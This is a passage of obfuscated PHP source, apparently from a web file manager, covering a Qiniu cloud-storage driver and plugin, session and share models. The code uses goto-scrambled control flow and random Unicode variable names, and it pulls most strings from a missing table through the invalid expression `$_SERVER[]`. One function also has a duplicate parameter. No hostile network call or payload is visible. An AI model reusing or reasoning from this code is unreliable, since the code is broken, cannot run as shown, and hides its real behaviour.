$D𵺏 = trim($D𵺏, $B[8]); $c֓ = empty($D𵺏) ? $B[33] : $D𵺏 . $B[8]; goto c砋; F̧: $B = array(); while (!0) { list($aԄ, $E雉) = $this->bucketManager->listFiles($this->bucket, $c֓, $Aˡ飯, $eר, $Cߣ); if ($E雉) { return !1; } $Aˡ飯 = array_key_exists($B[1162], $aԄ) ? $Aˡ飯 = $aԄ[$B[1193]] : $B[33]; foreach ($aԄ[$B[1194]] as $Dꍳ) { $C㋅ = $Dꍳ[$B[89]]; if ($Bل) { $C㋅ = array($B[28] => $C㋅, $B[77] => $Dꍳ[$B[1195]]); } $B[] = $C㋅; } if ($Aˡ飯 == $B[33]) { break; } } return $B; goto F˙; F˙: } public function rename($Dĥ˧, $B) { return $this->renameObject($Dĥ˧, $B); } public function fileInfo($a٥, $bԴ = false, $Fĳ = array()) { goto fâۑ; fâۑ: $AÝ =& $_SERVER[]; if ($bԴ) { return array($AÝ[28] => $this->pathThis($a٥), $AÝ[75] => $this->getPathOuter($AÝ[8] . $a٥), $AÝ[29] => $AÝ[163], $AÝ[77] => isset($Fĳ[$AÝ[1195]]) ? $Fĳ[$AÝ[1195]] : 0, $AÝ[156] => $this->ext($a٥)); } $dܥ = array($AÝ[28] => $this->pathThis($a٥), $AÝ[75] => $this->getPathOuter($AÝ[8] . $a٥), $AÝ[29] => $AÝ[163], $AÝ[183] => 0, $AÝ[106] => 0, $AÝ[77] => 0, $AÝ[156] => $this->ext($a٥), $AÝ[184] => !0, $AÝ[185] => !0); goto dɩš; b: return $dܥ; goto cΚ; dɩš: if (empty($Fĳ)) { $Fĳ = $this->objectMeta($a٥); if (!$Fĳ) { return $dܥ; } } if (isset($Fĳ[$AÝ[1196]])) { $dܥ[$AÝ[183]] = $Fĳ[$AÝ[1196]]; } if (isset($Fĳ[$AÝ[1195]])) { $dܥ[$AÝ[77]] = $Fĳ[$AÝ[1195]]; } goto b; cΚ: } public function folderInfo($C֧Н, $D = false) { goto bعꦪ; d՜Ȩ: return $BӐφ; goto eφӹ; bعꦪ: $a釷 =& $_SERVER[]; if ($D) { return array($a釷[28] => $this->pathThis($C֧Н), $a釷[75] => $this->getPathOuter($a釷[8] . $C֧Н), $a釷[29] => $a釷[76]); } $BӐφ = array($a釷[28] => $this->pathThis($C֧Н), $a釷[75] => $this->getPathOuter($a釷[8] . $C֧Н), $a釷[29] => $a釷[76], $a釷[183] => 0, $a釷[106] => 0, $a釷[1141] => !0, $a釷[1142] => !0); goto dÑ; dÑ: $C֧Н = rtrim($C֧Н, $a釷[8]) . $a釷[8]; $Eޅ汽 = $this->objectMeta($C֧Н); if (isset($Eޅ汽[$a釷[1196]])) { $BӐφ[$a釷[183]] = $Eޅ汽[$a釷[1196]]; } goto d՜Ȩ; eφӹ: } public function listPath($Aˬ۞, $Fꔼ = false) { goto d͕; d͕: $F =& $_SERVER[]; $Aˬ۞ = trim($Aˬ۞, $F[8]); $D = empty($Aˬ۞) ? $F[33] : $Aˬ۞ . $F[8]; goto Cጐ; Cጐ: $b = $F[33]; $b넂 = 1000; $B = $F[8]; goto eŽ; eŽ: $bɺ̏ = $d؄ = array(); while (!0) { list($F̼, $aӒ) = $this->bucketManager->listFiles($this->bucket, $D, $b, $b넂, $B); if ($aӒ) { return !1; } $b = array_key_exists($F[1162], $F̼) ? $b = $F̼[$F[1193]] : $F[33]; if (isset($F̼[$F[1197]])) { foreach ($F̼[$F[1197]] as $dںғ惛) { if ($dںғ惛 == $D) { continue; } $bɺ̏[] = $this->folderInfo($dںғ惛, $Fꔼ); } } if (isset($F̼[$F[1194]])) { foreach ($F̼[$F[1194]] as $AЙ) { if ($AЙ[$F[89]] == $D) { continue; } $d؄[] = $this->fileInfo($AЙ[$F[89]], $Fꔼ, $AЙ); } } if ($b == $F[33]) { break; } } return array($F[74] => $bɺ̏, $F[73] => $d؄); goto FЕÝ; FЕÝ: } public function has($E󝙇, $B䩻 = false, $c = true) { goto C; C: $cޞ =& $_SERVER[]; $E󝙇 = trim($E󝙇, $cޞ[8]); $Fߐ = empty($E󝙇) ? $cޞ[33] : $E󝙇 . $cޞ[8]; goto Eв; A٫: $b = 0; $bѢè = 0; while (!0) { list($Dօ, $C) = $this->bucketManager->listFiles($this->bucket, $Fߐ, $e֦, $Aˤ, $E详); if ($C) { return !1; } $e֦ = array_key_exists($cޞ[1162], $Dօ) ? $e֦ = $Dօ[$cޞ[1193]] : $cޞ[33]; if ($B䩻) { if (!empty($Dօ[$cޞ[1194]])) { $b += count($Dօ[$cޞ[1194]]); } if (!empty($Dօ[$cޞ[1197]])) { $bѢè += count($Dօ[$cޞ[1197]]); } if ($e֦ === $cޞ[33]) { break; } continue; } if ($c) { if (!empty($Dօ[$cޞ[1194]])) { return !0; } } else { if (!empty($Dօ[$cޞ[1197]])) { return !0; } } if ($e֦ == $cޞ[33]) { break; } } goto dФ; dФ: if ($B䩻) { return array($cޞ[187] => $b, $cޞ[188] => $bѢè); } return !1; goto DГ; Eв: $e֦ = $cޞ[33]; $Aˤ = 1000; $E详 = $cޞ[8]; goto A٫; DГ: } public function listAll($cҟ) { $Fؕ =& $_SERVER[]; $B޵ = $this->fileList($cҟ, 1); $Fڽ = array(); foreach ($B޵ as $eό) { $Fڽ[$eό[$Fؕ[28]]] = $eό[$Fؕ[77]]; } return $this->listAllFiles($cҟ, array_keys($Fڽ), $Fڽ); } public function canRead($Aի) { return $this->exist($Aի) ? !0 : !1; } public function canWrite($C) { return $this->exist($C) ? !0 : !1; } public function getContent($EӤ㢏˜) { return $this->fileSubstr($EӤ㢏˜, 0, -1); } public function setContent($eۛپΐ, $AƋ = '') { $D = $this->tempFile($this->pathThis($eۛپΐ)); file_put_contents($D, $AƋ); if ($this->upload($eۛپΐ, $D)) { $this->tempFileRemve($D); return !0; } return !1; } public function refreshUrls($b؞) { goto e; B: $A䷻ϒ = new Qiniu\Cdn\CdnManager($this->auth); list($F͐, $f) = $A䷻ϒ->refreshUrls($Eἒݛ); if ($f) { return !1; } goto f; f: return $F͐[$Cͺ[1198]] == $Cͺ[682] ? !0 : !1; goto f碅; e: $Cͺ =& $_SERVER[]; $Eἒݛ = array(); if (is_array($b؞)) { foreach ($b؞ as $EɌ돸) { $Eἒݛ[] = $this->link($EɌ돸); } } else { $Eἒݛ[] = $this->link($b؞); } goto B; f碅: } public function fileSubstr($eΆ, $DĶ, $B︷) { $A =& $_SERVER[]; if (!($A砥 = $this->link($eΆ))) { return !1; } $d݈կ = !1; if ($B︷ > 0) { $Aґ = $DĶ + $B︷ - 1; $d݈կ = array($A[1199] . $DĶ . $A[408] . $Aґ); } $Cх = url_request($A砥, $A[212], !1, $d݈կ); return $Cх[$A[675]] ? $Cх[$A[1021]] : !1; } public function upload($C, $d垈ʏ, $E߃ = false, $C = REPEAT_REPLACE) { $e̋ = new Qiniu\Storage\UploadManager(); $FՄ = $this->auth->uploadToken($this->bucket, $C); $c = get_file_mime(get_path_ext($d垈ʏ)); list($d󌓋, $aż) = $e̋->putFile($FՄ, $C, $d垈ʏ, null, $c); return $aż ? !1 : $this->getPathOuter($C); } public function uploadFormData($E䘄∲, $c = 3600) { return $this->uploadToken($E䘄∲, $c); } public function multiUploadFormData($C, $c۪ = 3600) { return $this->uploadToken($C, $c۪); } private function uploadToken($a岌, $aм = 3600) { goto Bκ; c: $f = null; $Eޑ = $this->auth->uploadToken($this->bucket, $f, $f, $Fك, !0); $eӶ⳶ = empty($this->region) || $this->region == $E[1202] ? $E[33] : $E[408] . $this->region; goto Eװ; Bκ: $E =& $_SERVER[]; $f = $aм; $Fك = array($E[1200] => $E[1201]); goto c; Eװ: $f = http_type() . "\x3a\57\x2f\165\x70\x6c\157\141\144{$eӶ⳶}\56\161\x69\156\151\165\x70\x2e\x63\157\155\x2f"; return array($E[1203] => $Eޑ, $E[1204] => $f); goto Aǉ; Aǉ: } public function download($D坊, $B) { goto c; c޲: fclose($då); return $B; goto Bզ; DȠ: $cΛ = 1024 * 200; $då = fopen($cфܮ, $_SERVER[][1205]); while (!0) { $f = $this->fileSubstr($D坊, $b݄, $cΛ); if ($f === !1) { return !1; } fwrite($då, $f); $b݄ += $cΛ; if (strlen($f) < $cΛ) { break; } } goto c޲; c: $cфܮ = IO::getPathInner(IO::mkfile($B)); if (!($eಥ = $this->link($D坊))) { return !1; } $b݄ = 0; goto DȠ; Bզ: } public function link($d͘ޤ, $e䖔Ħ = '') { if (!$this->isFile($d͘ޤ)) { return !1; } $b = $this->getHost() . $_SERVER[][8] . $this->pathEncode($d͘ޤ) . $e䖔Ħ; return $this->auth->privateDownloadUrl($b, 3600 * 12); } public function fileOut($b, $Bڵ = false, $Aۖ = false, $bЎ = '') { $AՒ =& $_SERVER[]; if (!$Aۖ) { $Aۖ = $this->pathThis($b); } $D = $Bڵ ? $AՒ[1206] . rawurlencode($Aۖ) : $AՒ[33]; $d = $this->link($b, $D); $this->fileOutLink($d); } public function fileOutServer($a, $d = false, $bڂ = false, $D = '') { parent::fileOut($a, $d, $bڂ, $D); } public function fileOutImage($Cۛ, $dƅ = 250) { $F񢎈 = $this->link($Cۛ, $_SERVER[][1207] . $dƅ); $this->fileOutLink($F񢎈); } public function fileOutImageServer($Bϐݝ, $eϢ = 250) { parent::fileOutImage($Bϐݝ, $eϢ); } public function hashMd5($D鼦) { $C =& $_SERVER[]; $Fȿآ = $this->objectMeta($D鼦); return isset($Fȿآ[$C[192]]) ? $Fȿآ[$C[192]] : !1; $b = $this->link($D鼦, $C[1208]); } public function size($e) { $Dٙ = $this->objectMeta($e); return $Dٙ ? $Dٙ[$_SERVER[][77]] : 0; } public function info($f܍) { if ($this->isFolder($f܍)) { return $this->folderInfo($f܍); } else { if ($this->isFile($f܍)) { return $this->fileInfo($f܍); } } return !1; } public function exist($B) { return $this->isFile($B) || $this->isFolder($B); } public function isFile($E) { return !$this->isFolder($E) && $this->objectMeta($E); } public function isFolder($aԪ) { return $this->cacheMethod($_SERVER[][219], $aԪ); } protected function objectMeta($FԈ) { return $this->cacheMethod($_SERVER[][220], $FԈ); } protected function _objectMeta($Aǹ) { $bՓӋ =& $_SERVER[]; list($Eɩ, $eď) = $this->bucketManager->stat($this->bucket, $Aǹ); if ($Eɩ) { $Eɩ[$bՓӋ[77]] = intval($Eɩ[$bՓӋ[1195]]); } return $Eɩ; } protected function _isFolder($AǞ) { $aʔ =& $_SERVER[]; list($eئ, $Aܓč) = $this->bucketManager->listFiles($this->bucket, trim($AǞ, $aʔ[8]) . $aʔ[8], $aʔ[33], 1, $aʔ[8]); return !empty($eئ[$aʔ[1194]]) || !empty($eئ[$aʔ[1197]]) ? !0 : !1; } } goto C㛏؞; f׍: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\160\x6c\x75\147\151\156\114\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x73\164\x61\x74\x75\x73", "\162\x65\147\151\x65\163\x74", "\143\157\156\146\151\x67"); public function loadList($Fݍҙ = false) { $fʎܑ = array_to_keyvalue($this->listData(), $_SERVER[][28]); if ($Fݍҙ) { return $fʎܑ[$Fݍҙ]; } return $fʎܑ; } public function init() { $FĬ =& $_SERVER[]; Hook::trigger($FĬ[2156]); $eХ = $this->loadPluginList(); foreach ($eХ as $B򶑹 => $eć) { $C뱔 = $this->appAllow($B򶑹, $eć); if (!$C뱔) { continue; } foreach ($eć[$FĬ[2157]] as $F => $Eς) { Hook::bind($F, $Eς); } } Hook::trigger($FĬ[2158]); Hook::trigger(ACTION); } public function appAllow($CѶᵎ, $B, $f = true) { $e =& $_SERVER[]; $b槅 = PLUGIN_DIR . $CѶᵎ . $e[2159]; if (!is_array($B) || !is_array($B[$e[2157]]) || !is_file($b槅) || $B[$e[675]] != 1) { return !1; } if ($f && !Action($e[2160])->checkAuth($CѶᵎ)) { return !1; } return !0; } public function unInstall($Aڜ) { $C =& $_SERVER[]; $Fψ = $this->loadList($Aڜ); if (file_exists(PLUGIN_DIR . $Aڜ)) { Hook::apply($Aڜ . $C[2161]); } $this->remove($Fψ[$C[363]]); } public function changeStatus($D٪, $b󐕮) { $a =& $_SERVER[]; $bЌ = $this->loadList($D٪); if ($b󐕮) { Hook::apply($D٪ . $a[2162]); } $this->update($bЌ[$a[363]], array($a[2163] => $b󐕮)); } public function appRegist($F, $f酫) { $d׊ =& $_SERVER[]; $D = $this->loadList($F); if ($D) { $this->update($D[$d׊[363]], array($d׊[2157] => $f酫)); } else { $A = array($d׊[28] => $F, $d׊[2157] => $f酫, $d׊[675] => 0, $d׊[6] => $this->getConfigDefault($F)); $this->insert($A); } } public function getConfigDefault($Dݏ) { $b =& $_SERVER[]; $F훩 = array(); $a݌ = $this->getPackageJson($Dݏ); if (!$a݌ && is_array($a݌[$b[2164]])) { return $F훩; } foreach ($a݌[$b[2164]] as $c => $Fў) { if (!isset($Fў[$b[355]]) || isset($F훩[$c])) { continue; } $F훩[$c] = $Fў[$b[355]]; } return $F훩; } public function getPackageJson($f筋) { return Hook::apply($f筋 . $_SERVER[][2165]); } public function getConfig($F͕͗, $fޞ = false) { $b΢ =& $_SERVER[]; $b = array(); $C͍ = $this->loadList($F͕͗); if ($C͍ && is_array($C͍[$b΢[6]])) { $b = $C͍[$b΢[6]]; } if (!$b || $fޞ) { $b = $this->getConfigDefault($F͕͗); } return $b; } public function setConfig($C, $dͶ = false) { goto a; a: $E𳍉 =& $_SERVER[]; $f܉ = $this->loadList($C); if (!$f܉) { return !1; } goto Bӡ; Bӡ: if ($dͶ == !1) { $dͶ = $this->getConfigDefault($C); } $Dĭ = $f܉[$E𳍉[6]]; foreach ($dͶ as $A˄ӊ => $D) { $Dĭ[$A˄ӊ] = is_string($D) ? trim($D) : $D; } goto EУϷ; EУϷ: $this->update($f܉[$E𳍉[363]], array($E𳍉[6] => $Dĭ)); goto Dԫ; Dԫ: } public function viewList() { goto dߋ̇; B: $Aأ䨶 = $this->loadPluginList(); $E = array(); foreach ($Aأ䨶 as $e݊ => $AŐ) { unset($AŐ[$e[2157]], $AŐ[$e[6]]); $aՕ = PLUGIN_DIR . $AŐ[$e[28]] . $e[2159]; if (!is_file($aՕ)) { continue; } $e = Hook::apply($AŐ[$e[28]] . $e[2165]); if (is_array($e)) { $E[$e݊] = array_merge($AŐ, $e); } } goto aȡþ; aȡþ: return $E; goto eҴʝ; dߋ̇: $e =& $_SERVER[]; $Aأ䨶 = $this->loadList(); $this->pluginScan($Aأ䨶); goto B; eҴʝ: } private function loadPluginList() { $bѰ =& $_SERVER[]; $E = $this->loadList(); if (strtolower(MOD) == $bѰ[2166]) { return $E; } $C = Hook::trigger($bѰ[2167], $E); if ($E && !$C) { die; } return $C ? $C : $E; } private function pluginScan($dې႗) { $a⇾ =& $_SERVER[]; recursion_dir(PLUGIN_DIR, $F, $CϽ, 0); foreach ($F as $dƟҷ) { $dֲ = get_path_this($dƟҷ); if (isset($dې႗[$dֲ]) || !file_exists($dƟҷ . $a⇾[2168]) || !file_exists($dƟҷ . $a⇾[2159])) { continue; } Hook::apply($dֲ . $a⇾[2162]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\155\x5f\x73\145\x73\x73\x69\157\156"; public function get($C߃ۣ) { $Cӱȏ =& $_SERVER[]; $Dܦ = $this->where(array($Cӱȏ[2169] => $C߃ۣ))->find(); if (!is_array($Dܦ)) { return !1; } return $Dܦ[$Cӱȏ[678]]; } public function set($f򃛶, $A荊, $F񑢋 = 3600) { $A =& $_SERVER[]; $aˍ = array($A[2169] => $f򃛶, $A[2098] => $A荊, $A[2170] => $F񑢋 + time()); if (Session::get($A[2171])) { $aˍ[$A[1406]] = Session::get($A[2171]); } else { $aˍ[$A[1406]] = 0; } if ($this->get($f򃛶)) { return $this->where(array($A[2169] => $f򃛶))->save($aˍ); } else { return $this->add($aˍ, array(), !0); } } public function remove($bɆ) { return $this->where(array($_SERVER[][2169] => $bɆ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[][2172] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\x65"; protected $dataAuto = array(array("\155\x6f\144\x69\146\x79\124\x69\x6d\x65", "\164\x69\155\145", "\151\156\163\x65\162\x74\54\165\160\x64\141\x74\x65", "\146\165\x6e\143\x74\151\x6f\x6e"), array("\143\162\x65\x61\x74\145\124\x69\x6d\x65", "\x74\151\155\145", "\151\156\x73\x65\x72\164", "\x66\x75\156\143\164\151\x6f\x6e"), array("\157\160\164\151\x6f\156\x73", '', "\151\156\x73\145\162\164\54\x75\x70\144\x61\164\x65\54\x73\x65\154\145\143\x74", "\152\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($B) { $Aɶ =& $_SERVER[]; $b = isset($B[0]) ? $B[0] : !1; return array($Aɶ[2173] => array(USER_ID, $Aɶ[2174]), $Aɶ[2136] => array($b, $Aɶ[2175])); } protected function listSimple() { $bϻ = array($_SERVER[][1406] => USER_ID); $e۝ = $this->field($this->fieldList)->where($bϻ)->select(); return $e۝ ? $e۝ : array(); } protected function getInfo($B, $cʘ = false) { $a =& $_SERVER[]; if ($cʘ) { return $this->_getShareInfo(array($a[437] => $B)); } $a = $this->cacheFunctionGet($a[2176], $B); return $a; } public function getInfoByHash($eܤ) { return $this->_getShareInfo(array($_SERVER[][439] => $eܤ)); } public function getInfoByPath($bˠ) { $dٗ =& $_SERVER[]; $Dіޑ = array($dٗ[1406] => USER_ID, $dٗ[365] => $bˠ); return $this->_getShareInfo($Dіޑ); } public function getInfoBySourcePath($dâ) { $Eÿ =& $_SERVER[]; $E쨃ǵ = array($Eÿ[1406] => USER_ID, $Eÿ[1005] => $dâ); return $this->_getShareInfo($E쨃ǵ); } private function _getShareInfo($b냗) { goto B朜ڤ; aӧ: $b냗 = array($Cֳ[437] => $A[$Cֳ[437]]); $Bۈ = $Cֳ[2177]; $F = Model($Cֳ[533])->order($Cֳ[363])->field($Bۈ)->where($b냗)->select(); goto D졦; D졦: if ($A[$Cֳ[365]] == $Cֳ[464]) { $A[$Cֳ[387]] = IO::info($A[$Cֳ[1005]]); } else { $A[$Cֳ[387]] = Model($Cֳ[1097])->pathInfo($A[$Cֳ[365]]); } $A[$Cֳ[2178]] = $F; return $A; goto aב; B朜ڤ: $Cֳ =& $_SERVER[]; $A = $this->where($b냗)->find(); if (!$A) { return !1; } goto aӧ; aב: } protected function getInfoAuth($a¥) { $A =& $_SERVER[]; $e = $this->getInfo($a¥); $e[$A[372]] = Model($A[450])->authMake($e[$A[2178]]); return $e; } protected function listData($b􌚨Զ = null, $d圥 = 300) { $a =& $_SERVER[]; $b = array(array($a[442] => array($a[912], 0), $a[444] => array($a[912], 0), $a[2179] => $a[2148])); if ($b􌚨Զ == $a[1835]) { $b = array($a[442] => 1); } else { if ($b􌚨Զ == $a[994]) { $b = array($a[444] => 1); } } $b[$a[1406]] = USER_ID; $b࿣ = $this->where($b)->selectPage($d圥); return $b࿣; } protected function listToMe($DΈ = 300) { goto B韑; aك: $DХ = array($DГ[2182] => $f, $DГ[2183] => $fŬ[$DГ[347]]); return $DХ; goto d鲲; C샋Ѿ: $AͽՖ = array($DГ[437] => array($DГ[380], array_keys($e))); $f = $this->field($BƗ)->where($AͽՖ)->select(); foreach ($f as $a뺈 => &$bҰ) { $bҰ[$DГ[2178]] = $e[$bҰ[$DГ[437]]]; } goto aك; B韑: $DГ =& $_SERVER[]; $A쒓 = Session::get($DГ[2180]); $főԺ = array_to_keyvalue($A쒓, $DГ[33], $DГ[2068]); goto EðӚ; Fشܿ: $e = array_to_keyvalue_group($fŬ[$DГ[350]], $DГ[437]); if (!$e) { return $fŬ; } $BƗ = $DГ[2181]; goto C샋Ѿ; EðӚ: $AͽՖ = array($DГ[517] => SourceModel::TYPE_USER, $DГ[452] => USER_ID); if ($főԺ) { $AͽՖ = array(array($DГ[517] => SourceModel::TYPE_USER, $DГ[452] => USER_ID), array($DГ[517] => SourceModel::TYPE_GROUP, $DГ[452] => array($DГ[7], $főԺ)), $DГ[2179] => $DГ[2148]); } $fŬ = Model($DГ[533])->where($AͽՖ)->selectPage($DΈ); goto Fشܿ; d鲲: } protected function shareAdd($DԻ, $e) { $eŖ =& $_SERVER[]; $B = $this->_addShareData($DԻ, $e); if (!empty($e[$eŖ[2184]])) { $this->_shareAuthSet($B, $e[$eŖ[2184]]); } $this->shareEventAdd($DԻ, $e, $eŖ[997]); return $B; } private function shareEventAdd($f, $fŇ, $aӘ = "\x61\x64\144") { goto f; A: return; goto e¨; bն: $eԪ܏ = $cӰť[2187]; if ($dٯ[$cӰť[442]] == $cӰť[464] && $fŇ[$cӰť[442]] == $cӰť[83]) { $eԪ܏ = $cӰť[2185]; } if ($dٯ[$cӰť[442]] == $cӰť[83] && $fŇ[$cӰť[442]] == $cӰť[464]) { $eԪ܏ = $cӰť[2188]; } goto d丵; d丵: if ($dٯ[$cӰť[444]] == $cӰť[464] && $fŇ[$cӰť[444]] == $cӰť[83]) { $eԪ܏ = $cӰť[2186]; } if ($dٯ[$cӰť[444]] == $cӰť[83] && $fŇ[$cӰť[444]] == $cӰť[464]) { $eԪ܏ = $cӰť[2189]; } Model($cӰť[501])->eventShare($f, $eԪ܏); goto A; f: $cӰť =& $_SERVER[]; if ($aӘ == $cӰť[997]) { if ($fŇ[$cӰť[442]] == $cӰť[83]) { Model($cӰť[501])->eventShare($f, $cӰť[2185]); } if ($fŇ[$cӰť[444]] == $cӰť[83]) { Model($cӰť[501])->eventShare($f, $cӰť[2186]); } return; } $dٯ = $this->getInfoByPath($f); goto bն; e¨: } private function _addShareData($e׫Ä, $A烯 = array()) { goto f; fǈ: return $A톭˰; goto dߌ; d: if ($E  = $this->where($aޏ)->find()) { return $E [$a铫ێ[437]]; } if ($e׫Ä == 0) { $aȐ = array($a铫ێ[28] => get_path_this($A烯[$a铫ێ[75]])); } else { $aȐ = Model($a铫ێ[738])->sourceInfo($e׫Ä); if (!$aȐ) { return !1; } } if (!$A烯[$a铫ێ[1313]]) { $A烯[$a铫ێ[1313]] = $aȐ[$a铫ێ[28]]; } goto Fފכ; bݸܗ: $A톭˰ = $this->add($c鈼); $D᜽ = array($a铫ێ[439] => short_id($A톭˰)); $this->where(array($a铫ێ[436] => $A톭˰))->save($D᜽); goto fǈ; Fފכ: $c鈼 = array($a铫ێ[1397] => USER_ID, $a铫ێ[379] => $e׫Ä, $a铫ێ[1313] => $a铫ێ[33], $a铫ێ[442] => 0, $a铫ێ[444] => 0, $a铫ێ[1005] => $a铫ێ[33], $a铫ێ[291] => $a铫ێ[33], $a铫ێ[788] => $a铫ێ[33], $a铫ێ[2191] => 0, $a铫ێ[2192] => 0, $a铫ێ[689] => 0, $a铫ێ[2193] => $a铫ێ[33], $a铫ێ[439] => $a铫ێ[33]); $Cȝ = explode($a铫ێ[47], $a铫ێ[2194]); foreach ($Cȝ as $e˭) { if (!isset($A烯[$e˭])) { continue; } $c鈼[$e˭] = $A烯[$e˭]; } goto bݸܗ; f: $a铫ێ =& $_SERVER[]; $aޏ = array($a铫ێ[379] => $e׫Ä, $a铫ێ[1397] => USER_ID); if ($e׫Ä == 0) { $aޏ = array($a铫ێ[2190] => $A烯[$a铫ێ[1005]], $a铫ێ[1397] => USER_ID); } goto d; dߌ: } private function _shareAuthSet($D, $cײ) { goto aȇ; E菟: return $béە->addAll($b, array(), !0); goto f֏ı; c: $béە->where(array($fʅ[437] => $D))->delete(); $b = array(); foreach ($cײ as $Bߐ) { $b҆ = SourceModel::TYPE_USER; if ($Bߐ[$fʅ[367]] == SourceModel::TYPE_GROUP) { $b҆ = SourceModel::TYPE_GROUP; } $Eя = array($fʅ[437] => $D, $fʅ[367] => $b҆, $fʅ[452] => intval($Bߐ[$fʅ[452]]), $fʅ[2196] => 0, $fʅ[2197] => -1); if ($Bߐ[$fʅ[2196]]) { $Eя[$fʅ[2196]] = $Bߐ[$fʅ[2196]]; } else { if ($Bߐ[$fʅ[2197]]) { $Eя[$fʅ[2197]] = $Bߐ[$fʅ[2197]]; } } $b[] = $Eя; } goto E菟; aȇ: $fʅ =& $_SERVER[]; if (!is_array($cײ)) { return !1; } $béە = Model($fʅ[2195]); goto c; f֏ı: } public function numViewAdd($A) { $F܋ =& $_SERVER[]; $E찼ݙ = array($F܋[436] => $A); $this->where($E찼ݙ)->setAdd($F܋[2191]); } public function numDownloadAdd($dި) { $d =& $_SERVER[]; $D = array($d[436] => $dި); $this->where($D)->setAdd($d[2192]); } protected function shareEdit($a, $A) { goto a޽; Eݏ: $this->_checkLinkShare($A, $BԶ); $bª = array(); $d = explode($aÂ[47], $aÂ[2198]); goto DΘ; DΘ: foreach ($d as $C䧂) { if (!array_key_exists($C䧂, $A)) { continue; } $bª[$C䧂] = $A[$C䧂]; } $this->shareEventAdd($BԶ[$aÂ[365]], $A, $aÂ[2036]); $this->where(array($aÂ[436] => $a))->save($bª); goto b䒑; a޽: $aÂ =& $_SERVER[]; $BԶ = $this->getInfo($a); if (!$BԶ) { return !1; } goto Eݏ; b䒑: if (isset($A[$aÂ[2184]])) { $this->_shareAuthSet($a, $A[$aÂ[2184]]); } return !0; goto Fؘ۔Е; Fؘ۔Е: } private function _checkLinkShare($F󟿑, $F깨) { goto a𗑈̗; Eط: if ($F깨[$c[387]][$c[29]] != $c[163]) { $e = $this->_folderReport($d툦); if (!$e) { return; } show_json(LNG($c[2199]) . $c[2200] . $e, !1); } $E͓ = Model($c[738])->fileInfoGet($F깨[$c[387]][$c[365]]); if (!$E͓) { return; } goto AϦ; a𗑈̗: $c =& $_SERVER[]; if ($F󟿑[$c[442]] != $c[83]) { return; } $d툦 = $F깨[$c[387]][$c[365]]; goto Eط; AϦ: $A = $this->shareFileMeta($E͓[$c[415]]); if (isset($A[$c[355]]) && $A[$c[355]] == $c[83]) { show_json(LNG($c[2201]), !1); } goto eޔ; eޔ: } private function _folderReport($B) { goto bލϚ; bލϚ: $e橩 =& $_SERVER[]; $EѰ = array($e橩[415] => array($e橩[912], 0), $e橩[675] => 3); $F = Model($e橩[2202])->where($EѰ)->field($e橩[415])->select(); goto eȇ; FƋ: $Aޱ = array_to_keyvalue($a𪊞, $e橩[33], $e橩[28]); $Aޱ[] = $e廚[$e橩[28]]; return implode($e橩[8], $Aޱ); goto eč; bЌߎ: $EѰ = array($e橩[415] => array($e橩[7], $F), $e橩[455] => array($e橩[737], "\45{$d̡߶}\x25"), $e橩[393] => 0); $e廚 = Model($e橩[738])->where($EѰ)->field($e橩[2203])->find(); if (!$e廚) { return !1; } goto BΘİ; eȇ: if (!$F) { return !1; } $F = array_to_keyvalue($F, $e橩[33], $e橩[415]); $d̡߶ = $e橩[47] . $B . $e橩[47]; goto bЌߎ; BΘİ: $EƆ = substr($e廚[$e橩[455]], strpos($e廚[$e橩[455]], $d̡߶)); $EѰ = array($e橩[365] => array($e橩[7], trim($EƆ, $e橩[47]))); $a𪊞 = Model($e橩[738])->where($EѰ)->field($e橩[28])->select(); goto FƋ; eč: } protected function remove($D) { goto eÆ; Eػω: $dϤ = $this->where($EƼ)->delete(); if ($dϤ) { Model($a[533])->where(array($a[437] => $D))->delete(); } $fĈҗ = is_array($D) ? $D[1] : array($D); goto c; eÆ: $a =& $_SERVER[]; if (is_array($D)) { $D = array($a[7], $D); } $EƼ = array($a[437] => $D); goto Eػω; c: for ($Añ = 0; $Añ < count($fĈҗ); $Añ++) { $B򫚞 = $this->getInfo($fĈҗ[$Añ]); if ($B򫚞[$a[444]] == $a[83]) { Model($a[501])->eventShare($B򫚞[$a[365]], $a[2189]); } if ($B򫚞[$a[442]] == $a[83]) { Model($a[501])->eventShare($B򫚞[$a[365]], $a[2188]); } } return $dϤ; goto D󊎨; D󊎨: } protected function removeBySource($Dٗ) { goto e˔إ; b: $aŸ = array_to_keyvalue($aŸ, $eʐ[33], $eʐ[437]); if (!$aŸ) { return; } $BԶ = array($eʐ[436] => array($eʐ[380], $aŸ)); goto aۚ; aۚ: $this->where($BԶ)->delete(); Model($eʐ[533])->where($BԶ)->delete(); goto b䔚; e˔إ: $eʐ =& $_SERVER[]; $BԶ = array($eʐ[379] => array($eʐ[380], $Dٗ)); $aŸ = $this->field($eʐ[437])->where($BԶ)->select(); goto b; b䔚: } public function listAll($c͸) { goto a; eۅ: $d = $this->_makeOrder()->where($c)->selectPage(20); if (empty($d[$F󖙃[350]])) { return array(); } $this->_listDataApply($d[$F󖙃[350]]); goto cߎ; cߎ: return $d; goto B؉; a: $F󖙃 =& $_SERVER[]; $c = array(); if ($c͸[$F󖙃[1406]]) { $c[$F󖙃[1406]] = $c͸[$F󖙃[1406]]; } goto A; A: if ($c͸[$F󖙃[688]]) { $Bʈ = $c͸[$F󖙃[689]] ? $c͸[$F󖙃[689]] : strtotime(date($F󖙃[2204])); $c[$F󖙃[183]] = array($F󖙃[317], array($c͸[$F󖙃[688]], $Bʈ)); } if ($c͸[$F󖙃[29]]) { $c[$c͸[$F󖙃[29]]] = 1; } else { $c[] = array($F󖙃[442] => array($F󖙃[912], 0), $F󖙃[444] => array($F󖙃[912], 0), $F󖙃[2179] => $F󖙃[2148]); } if ($c͸[$F󖙃[2144]]) { $c[] = array($F󖙃[439] => $c͸[$F󖙃[2144]], $F󖙃[1313] => array($F󖙃[737], "\45{$c͸[$F󖙃[2144]]}\45"), $F󖙃[2179] => $F󖙃[2148]); } goto eۅ; B؉: } public function listDataApply($aȲ) { $this->_listDataApply($aȲ); return $aȲ; } private function _listDataApply(&$d⌏) { $Cͱ =& $_SERVER[]; $Aʝش = array_to_keyvalue($d⌏, $Cͱ[33], $Cͱ[1406]); $aƶ = Model($Cͱ[473])->userListInfo(array_unique($Aʝش)); $f٧Ŧ = 